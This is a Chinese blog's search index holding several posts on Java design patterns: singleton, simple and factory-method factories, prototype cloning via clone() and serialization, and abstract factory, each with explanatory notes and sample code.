<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>23种设计模式（0）-总览</title>
    <url>/2021/10/20/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%880%EF%BC%89-%E6%80%BB%E8%A7%88/</url>
    <content><![CDATA[<h2 id="设计模式的分类"><a href="#设计模式的分类" class="headerlink" title="设计模式的分类"></a>设计模式的分类</h2><span id="more"></span>

<p>总体来说，设计模式分为三大类：</p>
<p><strong>创建型模式，共五种：</strong>工厂方法模式、抽象工厂模式、单例模式、建造者模式、原型模式</p>
<p><strong>结构型模式，共七种：</strong>适配器模式、装饰器模式、代理模式、外观模式、桥接模式、组合模式、享元模式</p>
<p><strong>行为性模式，共十一种：</strong>策略模式、模板方法模式、观察者模式、迭代子模式、责任链模式、命令模式、备忘录模式、状态模式、访问者模式、中介者模式、解释器模式。</p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>设计模式总览</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（1）-单例模式</title>
    <url>/2021/10/24/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%881%EF%BC%89-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>属于创建型模式，提供了一种创建对象的最佳方式。涉及到一个单一的类，该类负责创建自己的对象，同时保证只有单个对象被创建。</p>
<p><strong>注意：</strong></p>
<ul>
<li>单例类只能有一个实例</li>
<li>单例类必须自己创建自己的唯一实例</li>
<li>单例类必须给所有其他对象提供这一实例</li>
</ul>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>主要解决：</strong>一个全局使用的类的对象被频繁地创建于销毁</p>
<p><strong>何时使用：</strong>想要控制某个类的实例的数目，节省系统资源的时候</p>
<p><strong>关键：</strong>构造函数私有</p>
<p><strong>自己加的理解：</strong>在程序中，对象销毁之后，重新创建对象不叫单例模式（这种可以通过同步机制实现）；<strong>只有程序运行期间，一个类只创建一次对象，且只有这一个对象，才叫单例模式</strong></p>
<h2 id="几种实现方式"><a href="#几种实现方式" class="headerlink" title="几种实现方式"></a>几种实现方式</h2><h3 id="饿汉式"><a href="#饿汉式" class="headerlink" title="饿汉式"></a>饿汉式</h3><p>优点：避免了多线程的同步问题</p>
<p>缺点：容易产生垃圾对象；可以通过<strong>反射</strong>破解，构造出新的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungryMan</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> HungryMan hungryMan = <span class="keyword">new</span> HungryMan();		<span class="comment">//预先创建好实例</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungryMan</span><span class="params">()</span> </span>&#123;		<span class="comment">//构造函数私有化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungryMan <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hungryMan;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DCL懒汉式（DCL，即double-checked-locking）"><a href="#DCL懒汉式（DCL，即double-checked-locking）" class="headerlink" title="DCL懒汉式（DCL，即double-checked locking）"></a>DCL懒汉式（DCL，即double-checked locking）</h3><p>优点：①使用DCL懒汉式，可以保证程序在多线程情况下，也是可以正确运行的</p>
<p>​            ②由于获取锁需要消耗资源，所以在<code>synchronized</code>加锁外面再套一层if判断</p>
<p>缺点：还是<strong>防不了反射</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMan</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> LazyMan lazyMan;		<span class="comment">//保证是一个原子性操作，避免指令重排</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyMan</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LazyMan <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazyMan == <span class="keyword">null</span>)&#123;		<span class="comment">//先进行一层判断，避免每次都要获取锁的过程，不能因为每次都在锁外面等候，大大提高效率</span></span><br><span class="line">            <span class="keyword">synchronized</span> (LazyMan.class) &#123;		<span class="comment">//同步获取HungryMan的锁，解决多线程问题（第一重锁）</span></span><br><span class="line">                <span class="keyword">if</span> (lazyMan == <span class="keyword">null</span>) &#123;		<span class="comment">//保证只有一个实例对象，但不是原子性操作（第二重锁）</span></span><br><span class="line">                    lazyMan = <span class="keyword">new</span> LazyMan();</span><br><span class="line">                   <span class="comment">/**</span></span><br><span class="line"><span class="comment">                    * 1、分配内存空间</span></span><br><span class="line"><span class="comment">                    * 2、执行构造方法，初始化对象</span></span><br><span class="line"><span class="comment">                    * 3、把这个对象指向这个空间</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazyMan;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="枚举（最佳）"><a href="#枚举（最佳）" class="headerlink" title="枚举（最佳）"></a>枚举（最佳）</h2><p>优点：<strong>避免多线程同步问题</strong>、<strong>支持自动序列化机制</strong>、<strong>防止反序列化</strong>、也<strong>不能通过反射构造对象</strong></p>
<p>机制：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">EnumMan</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> EnumMan <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在枚举中，可以直接获得实例化对象，将实例化对象作为枚举中的要素，可以<strong>将要单例的类直接设置为枚举类型</strong></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>同步锁</tag>
        <tag>反射</tag>
        <tag>enum枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（2）-工厂模式</title>
    <url>/2021/10/20/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%882%EF%BC%89-%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>工厂模式属于<strong>创建型模式</strong>，它提供了一种创建对象的最佳方式。</p>
<p>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>作用：</strong>实现了创建者和调用者的分离</p>
<p><strong>满足的OOP七大原则：</strong></p>
<ul>
<li>开闭原则</li>
<li>依赖倒置原则</li>
<li>迪米特法则</li>
</ul>
<p><strong>核心本质：</strong></p>
<ul>
<li>实例化对象不使用new，用工厂方法代替</li>
<li>将选择实现类，创建对象统一管理和控制。从而将调用者和我们的实现类解耦</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>对于复杂类，推荐使用工厂模式</li>
<li>对于简单类，特别是只需要通过new就可以完成创建的对象，无需使用工厂模式（如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度）</li>
</ul>
<h2 id="详细分类"><a href="#详细分类" class="headerlink" title="详细分类"></a>详细分类</h2><h3 id="简单工厂模式（静态工厂模式）"><a href="#简单工厂模式（静态工厂模式）" class="headerlink" title="简单工厂模式（静态工厂模式）"></a>简单工厂模式（静态工厂模式）</h3><p><strong>一句话介绍：</strong>①增加一个中间工厂类，用于创建产品对象 ②方法是静态的</p>
<p><strong>不推荐使用</strong></p>
<ul>
<li>之所以静态工厂模式，是因为工厂的方法是静态的方法</li>
<li>对于新增的产品，需要去覆盖已经存在的代码</li>
<li>用来生产<strong>同一等级结构</strong>中的任意产品</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小汽车实现汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">smallCar</span> <span class="keyword">implements</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;smallCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大汽车实现汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">largeCar</span> <span class="keyword">implements</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;largeCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//静态工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//方式一：根据传入的参数决定汽车的类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getCar</span><span class="params">(String car)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (car) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;smallCar&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> smallCar();</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;largeCar&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> largeCar();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//方式二：根据调用的方法决定汽车的类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getSmallCar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> smallCar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Car <span class="title">getLargeCar</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> largeCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CarFactory.getCar(<span class="string">&quot;smallCar&quot;</span>).printName();</span><br><span class="line">        CarFactory.getSmallCar().printName();</span><br><span class="line">        CarFactory.getLargeCar().printName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的是静态工厂的写法，根据调用者传入给静态工厂的参数（或者根据调用的方法），从而决定创建的是何种汽车类型</p>
<p>虽然看起来简单，但是有缺点</p>
<ul>
<li>不满足开闭原则（维护复杂）</li>
</ul>
<h3 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h3><p><strong>一句话介绍：</strong>①增加一个中间工厂接口 ②每增加一种产品，就要增加一个对应工厂类实现工厂接口 ③创建产品工作交给工厂完成</p>
<ul>
<li>用来生产<strong>同一等级结构</strong>中的任意产品</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//汽车接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小汽车</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallCar</span> <span class="keyword">implements</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;smallCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大汽车</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LargeCar</span> <span class="keyword">implements</span>  <span class="title">Car</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;largeCar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//工厂接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">Car <span class="title">getCar</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建SmallCar的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallCarFactory</span> <span class="keyword">implements</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">getCar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SmallCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建LargeCar的工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LargeCarFactory</span> <span class="keyword">implements</span> <span class="title">CarFactory</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">getCar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LargeCar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//用小汽车工厂生产小汽车</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> SmallCarFactory().getCar());</span><br><span class="line">        <span class="comment">//用大汽车工厂生产大汽车</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> LargeCarFactory().getCar());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点：</strong></p>
<ol>
<li>一个调用者想创建一个对象，只要知道其名称就可以了</li>
<li>扩展性高（因为满足开闭原则），如果想要增加一个产品，只要扩展一个工厂类就可以</li>
<li>屏蔽产品的具体实现，调用者只关心产品的接口</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li>每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这不是什么好事。</li>
</ol>
<h3 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h3><p>也是一种<strong>创建型模式</strong></p>
<p><strong>一句话介绍：</strong>围绕一个超级工厂创建其他工厂。该超级工厂又称为工厂的工厂。</p>
<p>具体介绍转战到另一篇博客：<a href="https://liu-ruyang.github.io/2021/12/02/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%885%EF%BC%89-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/">23种设计模式（5）-抽象工厂模式</a></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（3）-原型模式</title>
    <url>/2021/11/01/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%883%EF%BC%89-%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>原型模式是用于<strong>创建重复的对象</strong>，同时又能保证性能。</p>
<p><strong>意图：</strong>用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p>
<h2 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h2><p>主要有两种情况：一种是<strong>浅克隆</strong>；一种是<strong>深克隆</strong>。</p>
<h3 id="浅克隆"><a href="#浅克隆" class="headerlink" title="浅克隆"></a>浅克隆</h3><p><strong>主要理解：</strong>创建一个新对象，新对象的属性和原来对象完全相同，<strong>对于非基本类型属性，仍指向原有属性所指向的对象的内存地址</strong></p>
<p><strong>前提：</strong>实现Cloneable接口</p>
<p><strong>关键代码：</strong>重写Object对象的clone()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        Person person1 = (Person) person.clone();   <span class="comment">//克隆一个对象</span></span><br><span class="line">        System.out.println(person == person1);      <span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/01/3mPiehFbIwtHou8.png" alt="image-20211101201003624"></p>
<ul>
<li><p>运行结果显示false，克隆后返回的的对象和原来的对象是两个对象</p>
</li>
<li><p>但是对于非基本类型属性，仍指向原来属性所指向的对象的地址（解决方法看深克隆的重写clone方法）</p>
</li>
</ul>
<h3 id="深克隆"><a href="#深克隆" class="headerlink" title="深克隆"></a>深克隆</h3><p><strong>主要理解：</strong>创建一个新对象，<strong>属性中的引用的其他对象也会被克隆，不再指向原有对象的地址</strong></p>
<h4 id="重写clone-方法"><a href="#重写clone-方法" class="headerlink" title="重写clone()方法"></a>重写clone()方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthday</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthday</span><span class="params">(Date birthday)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">null</span>;</span><br><span class="line">        person = (Person) <span class="keyword">super</span>.clone();</span><br><span class="line">        <span class="comment">//经修改，克隆Person的对象的时候，内部的非基本类型属性也会被克隆，并将引用地址给到克隆出来的对象的属性中</span></span><br><span class="line">        <span class="comment">//如此一来，就可以实现在修改克隆后的对象时，不会影响原来的对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.getBirthday() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            person.setBirthday((Date) <span class="keyword">this</span>.getBirthday().clone());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> person;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通过重写clone方法，将对象中非基本类型属性也clone一下</strong>（如果非基本类型属性是一个对象，且其还有其他非基本类型属性，则需继续将非基本类型属性的clone方法也进行重写，即“套娃”）</p>
<h4 id="反序列化方式"><a href="#反序列化方式" class="headerlink" title="反序列化方式"></a><a href="https://liu-ruyang.github.io/2021/11/01/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化方式</a></h4><p><strong>前提：</strong>被序列化和反序列化的类需要<strong>实现Serializable接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;      <span class="comment">//实现Cloneable接口，就可以实现对象的浅克隆</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getBirthday</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBirthday</span><span class="params">(Date birthday)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.birthday = birthday;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        Person person1 = (Person) Util.clone(person);</span><br><span class="line">        System.out.println(person1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现序列化和反序列化深克隆的工具类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">clone</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用数组作为中间数据过渡的工具</span></span><br><span class="line">        <span class="comment">//Byte[] bytes = new Byte[1024 * 10];</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="comment">//也可以不用此输入流，换用其他输入流，并且用一个字节数组来代替其作用</span></span><br><span class="line">        ByteArrayOutputStream stream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="comment">//使用ObjectOutputStream的writeObject进行序列化</span></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(stream);</span><br><span class="line">        objectOutputStream.writeObject(obj);        <span class="comment">//写进了stream流</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="comment">//首先将存入stream输出流中的数据转为字节数组，然后用一个输入流读取其数据</span></span><br><span class="line">        ByteArrayInputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(stream.toByteArray());</span><br><span class="line">        <span class="comment">//使用ObjectInputStream的writeObject进行序列化</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        Object object = objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/01/gtKLRAHhnwfNY1E.png" alt="image-20211101222809004"></p>
<ul>
<li>上述序列化和反序列化的实现操作，可以放在单独的工具类中，也可以放在clone方法中（但这样需要实现Cloneable接口）</li>
<li><strong>其中，如果对象由非基本类型属性，则非基本类型属性也需要实现Serializable接口</strong></li>
</ul>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ol>
<li>资源优化场景</li>
<li>类初始化需要小号非常多的资源（包括数据、硬件资源等）</li>
<li>性能和安全要求的场景</li>
<li>通过new产生一个对象需要非常繁琐的数据准备或访问权限，则可以使用原型模式</li>
<li>一个对象多个修改这的场景</li>
<li><strong>实际项目中，原型模式很少单独出现，一般是和工厂模式一块出现：通过clone方法创建一个对象，然后由工厂方法提供给调用者使用</strong></li>
</ol>
<hr>
<hr>
<h2 id="补充：Object类的clone方法为什么一定要实现Cloneable接口？"><a href="#补充：Object类的clone方法为什么一定要实现Cloneable接口？" class="headerlink" title="补充：Object类的clone方法为什么一定要实现Cloneable接口？"></a>补充：Object类的clone方法为什么一定要实现Cloneable接口？</h2><p>我们看官方对Object类的clone方法的说明：</p>
<p><img src="https://i.loli.net/2021/11/01/83ExX7eQjhaOnMT.png" alt="image-20211101201632351"></p>
<p>翻译后：</p>
<p><img src="https://i.loli.net/2021/11/01/iK7WbqhYljsCy1k.png" alt="image-20211101201710704"></p>
<p><strong>我的理解：</strong>clone方法是在Cloneable接口中声明的，但是Object类本身没有实现这个接口，所以如果直接调用Object的clone方法（不继承Cloneable接口），则会包运行时异常CloneNotSupportedException。</p>
<p>在Cloneable接口中也有明确说明，翻译后：</p>
<p><img src="https://i.loli.net/2021/11/01/yNiuhGnzUkcRlT6.png" alt="image-20211101201958556"></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>Cloneable接口</tag>
        <tag>序列化和反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（5）-抽象工厂模式</title>
    <url>/2021/12/02/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%885%EF%BC%89-%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><span id="more"></span>

<p>抽象工厂模式属于创建型模式，提供了一种创建对象的最佳创建方式。</p>
<p>抽象工厂模式，是一个超级工厂，用于创建其他工厂的工厂。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>用途：</strong>提供一个创建<strong>一系列相关或相互依赖</strong>对象的接口，而无需指定他们具体的类</p>
<p><strong>何时使用：</strong>系统的产品有多于一个的产品族，而系统只消费其中某一族的产品</p>
<p><strong>本质：抽象工厂模式是工厂方法模式的升级版；工厂方法模式针对的是只有一个产品族；而当产品族不止一个的时候，工厂方法模式就升级成了抽象工厂模式</strong></p>
